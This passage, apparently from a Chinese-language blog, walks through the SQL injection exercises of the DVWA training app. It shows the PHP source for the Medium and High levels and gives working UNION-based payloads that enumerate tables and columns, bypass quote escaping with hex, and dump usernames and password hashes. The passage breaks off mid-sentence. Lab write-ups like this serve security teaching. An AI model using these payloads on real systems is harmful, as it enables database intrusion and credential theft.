Za/sG91QHCPAEGAEA36KoQY/nW5nINx2TWmUehBAAAS+vopYkliwVE+XO1rh0rPVdr36zxS8+XP9fosrny/RuZ52Lzqme/1LFU6/gref8bGX+p9xcAAFLrihDL+mDf6HPlZ3eq46qeMFrOdWmlQMi6zqrWuOWPq6+Ry/q53mvoWhUnix2/Ge//UuMv9f4CAEA7dEWINUP5B/OlPqQ3+0P8YuOlvBHGSq3krFMj73+jRBcAAKtNV4VYKz5wVy9ra9VxFlNriV2jr2+1WmfgAACASl0VYq3SztvjN+NYrZqr8AIAgOVx18QlrKYzUM0aN2uc5dw1sR06YY4AALCUx4rF4tfNHrSvry++SnCWpJ5rkpZ7A496Xl/rWI3eNbHWnBa7+1/WnQDr2a/W/FbyRclL/T3Uc9fEel9f/bvVO/5i2wAA6F2P53JRLBZbfpzZ2dmKxx0dYgAAACvRrhCzNBEAACAxIQYAAJCYEAMAAEhMiAEAACQmxAAAABITYgAAAIkJMQAAgMTWtHsCzdDIly73Eu8LAACsTh0fYmtzuUfiIitAetGDublH3p+s9wsAAEjL0kQAAIDEujLEuvGMz9pczpk+AADoEh2/NDFr+V1JKVyql+aVv656nKzHWc9lHafWsWrNu9Z+zQ7Jeua32O9Ya35Z70/1OEuNDQAAvajjQyzi0RDI2r7YvqWzTbUCY7HrrBZ7rjoSs36udY1b9baVxMti81vs9681l6wxsmKsnvcPAAB6UdcsTXwwN5cZXo28PuvnrMe1nuuEpYO13qPFfv9Gx6oOLdEFAACVuuKMWLnFliq2ymLL8hp5fSfrht8BAABS6fgQa/cyt2Ycv1vOGLUjggEAoBN1zdLEerXyzE2zxq613K8Z4zc7lMQXAAA0ruPPiEUsftfBWndDrH7NYndYzLqRRWlb1k0qym9UkfX6rBt21Jr/SpQfP2vs6ptyZB17JfOr5/0DAIBe9FixWPy62YP29fXFVz5kAwAAq9zjuVwUi8WWH2d2drbicc8tTQQAAGg3IQYAAJCYEAMAAEhMiAEAACQmxAAAABITYgAAAIkJMQAAgMSEGAAAQGJCDAAAIDEhBgAAkJgQAwAASEyIAQAAJCbEAAAAEhNiAAAAiQkxAACAxIQYAABAYkIMAAAgMSEGAACQmBADAABITIgBAAAkJsQAAAASE2IAAACJCTEAAIDEhBgAAEBiQgwAACAxIQYAAJCYEAMAAEhMiAEAACQmxAAAABITYgAAAIkJMQAAgMSEGAAAQGJrWjXw47lcq4YGAADoaC0JsWKx2IphAQAAuoKliQAAAIkJMQAAgMSEGAAAQGJCDAAAIDEhBgAAkJgQAwAASEyIAQAAJCbEAAAAEhNiAAAAiQkxAACAxIQYAABAYkIMAAAgMSEGAACQmBADAABITIgBAAAk9v/TTUzyQY4KmQAAAABJRU5ErkJggg==" alt="image-20220822165337530"></p><p>尝试输入 1&#39; or &#39;1&#39;=&#39;1，成功</p><p><img src="/blog/assets/image-20220525085614685-FoupZmPY.png" alt="image-20220525085614685"></p><p>尝试输入 1&#39; or &#39;2&#39; = &#39;2，同样成功</p><p><img src="/blog/assets/image-20220822165543362-X_VbGoTA.png" alt="image-20220822165543362"></p><p>上面两测试都返回了多个结果，说明可以字符型注入</p><h2 id="medium" tabindex="-1"><a class="header-anchor" href="#medium"><span>Medium</span></a></h2><h3 id="源代码-1" tabindex="-1"><a class="header-anchor" href="#源代码-1"><span>源代码</span></a></h3><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;Submit&#39;</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// Get input</span></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="token interpolation"><span class="token variable">$id</span></span>;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;&#39;</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;&lt;/pre&gt;&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Get results</span></span>
<span class="line">    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Display values</span></span>
<span class="line">        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;first_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;last_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token comment">// This is used later on in the index.php page</span></span>
<span class="line"><span class="token comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span>
<span class="line"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT COUNT(*) FROM users;&quot;</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;&#39;</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;&lt;/pre&gt;&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token variable">$number_of_rows</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="代码分析-1" tabindex="-1"><a class="header-anchor" href="#代码分析-1"><span>代码分析</span></a></h3><p>利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><h3 id="漏洞例用" tabindex="-1"><a class="header-anchor" href="#漏洞例用"><span>漏洞例用</span></a></h3><h4 id="数字型注入" tabindex="-1"><a class="header-anchor" href="#数字型注入"><span>数字型注入</span></a></h4><p>抓包慕改ID为 1 order by 1 # ，成功</p><p><img src="/blog/assets/image-20220525090242063-DCay4koF.png" alt="image-20220525090242063"></p><p><img src="/blog/assets/image-20220822170401845-DEWTnW2x.png" alt="image-20220822170401845"></p><h4 id="顺便看一下字段数" tabindex="-1"><a class="header-anchor" href="#顺便看一下字段数"><span>顺便看一下字段数</span></a></h4><p><code>1 order by 2 #</code> 查询成功</p><p><img src="data:image/png;base64,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" alt="image-20220822170908647"></p><p><code>1 order by 3 #</code> 查询失败</p><p><img src="/blog/assets/image-20220822170935404-M9-CMGIu.png" alt="image-20220822170935404"></p><p><strong>说明表中只有两个字段</strong></p><h4 id="获取当前数据库" tabindex="-1"><a class="header-anchor" href="#获取当前数据库"><span>获取当前数据库</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">1 union select 1,database() #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="/blog/assets/image-20220822171302081-D6nJt_MA.png" alt="image-20220822171302081"></p><p>当前的数据库为dvwa</p><h4 id="获取数据库中的表" tabindex="-1"><a class="header-anchor" href="#获取数据库中的表"><span>获取数据库中的表</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="/blog/assets/image-20220822171604960-Bc14Cq94.png" alt="image-20220822171604960"></p><p><strong>发现 guestbook, users 两个表</strong></p><h4 id="获取字段名" tabindex="-1"><a class="header-anchor" href="#获取字段名"><span>获取字段名</span></a></h4><p>需要注意的是，在Med等级引号会被转义，但实际上可以用16进制绕过转义</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="/blog/assets/image-20220822171814136-B744Nx-b.png" alt="image-20220822171814136"></p><p><strong>发现字段名： user_id, first_name, last_name, user, password, avatar, last_login, failed_login</strong></p><h4 id="尝试查表" tabindex="-1"><a class="header-anchor" href="#尝试查表"><span>尝试查表</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="/blog/assets/image-20220822172127381-DMLAAGix.png" alt="image-20220822172127381"></p><h2 id="high" tabindex="-1"><a class="header-anchor" href="#high"><span>High</span></a></h2><h3 id="源代码-2" tabindex="-1"><a class="header-anchor" href="#源代码-2"><span>源代码</span></a></h3><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;Submit&#39;</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// Get input</span></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="token interpolation"><span class="token variable">$id</span></span>;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;&#39;</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;&lt;/pre&gt;&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Get results</span></span>
<span class="line">    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Display values</span></span>
<span class="line">        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;first_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;last_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token comment">// This is used later on in the index.php page</span></span>
<span class="line"><span class="token comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span>
<span class="line"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT COUNT(*) FROM users;&quot;</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;&#39;</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;&lt;/pre&gt;&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token variable">$number_of_rows</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="代码分析-2" tabindex="-1"><a class="header-anchor" href="#代码分析-2"><span>代码分析</span></a></h3><p>与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 